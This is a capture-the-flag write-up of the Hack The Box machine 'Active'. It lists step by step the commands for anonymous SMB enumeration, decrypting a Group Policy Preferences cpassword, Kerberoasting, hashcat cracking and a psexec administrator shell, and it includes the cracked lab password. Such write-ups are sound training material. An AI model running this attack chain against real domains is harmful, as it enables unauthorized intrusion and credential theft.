+++
title = 'Hack The Box — Active Writeup'
date = '2026-06-07'
draft = false
tags = ["Hack The Box", "Windows", "Active Directory"]
summary = 'An easy-rated Active Directory box involving SMB enumeration and GPP passwords for initial access, and kerberoasting to obtain administrator access.'
[cover]
image = 'main.png'
+++

This is a walkthrough of the machine Active from Hack The Box.

Machine information:
- **Difficulty**: Easy‍
- **OS**: Windows
- **Area of interest**: Enterprise Network, Vulnerability Assessment, Active Directory, Software & OS exploitation, Security Tools, Authentication
- **Vulnerability**: Default Credentials, Weak Permissions, Anonymous/Guest Access
- **Technology**: SMB, Kerberos
- **Technique**: Reconnaissance, Password Cracking, Kerberoasting

# Nmap

```bash
sudo nmap -A --open -sV -sC -v -p- <IP>
```

Starting off with an Nmap scan, we discover that the machine is a **domain controller**, and that the domain name is **active.htb**.

{{< figure src="image_1.png" align="center" >}}

# SMB Enumeration

Using `netexec`, we discover a readable share named **Replication**:

```bash
netexec smb <IP> -u "" -p "" --shares
```

{{< figure src="image_2.png" align="center" >}}

Using `smbclient` and anonymous login, we can enumerate the Replication share:

```bash
smbclient -N \\\\<IP>\\Replication
```

We discover a directory named `active.htb`, so we will download it to take a closer look:

{{< figure src="image_3.png" align="center" >}}

```
RECURSE ON
```

```
PROMPT OFF
```

```
mget *
```

Looking at the contents, we discover a **Group Policy Preferences (GPP)** related file titled `Groups.xml`, which contains a password and the username **SVC_TGS**:

```xml
#active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

# Initial access

To obtain the password, we can pass it to `gpp-decrypt`:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

{{< figure src="image_4.png" align="center" >}}

>At this stage, you could access the **Users** share, where you will find the first `user.txt` flag. However, I moved on from here to directly obtain access as an administrator user.

# Privilege escalation

With valid credentials in hand, we can attempt **Kerberoasting** with `impacket-GetUserSPNs`:

```bash
impacket-GetUserSPNs -request -outputfile hashes.txt -dc-ip <IP> active.htb/SVC_TGS
```

{{< figure src="image_5.png" align="center" >}}

Now, we can crack **Administrator**'s TGS with `hashcat`:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

{{< figure src="image_6.png" align="center" >}}

Finally, we can get a shell on the machine using `impacket-psexec` and read both the `user.txt` and `proof.txt` flags:

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@<IP>
```

{{< figure src="image_7.png" align="center" >}}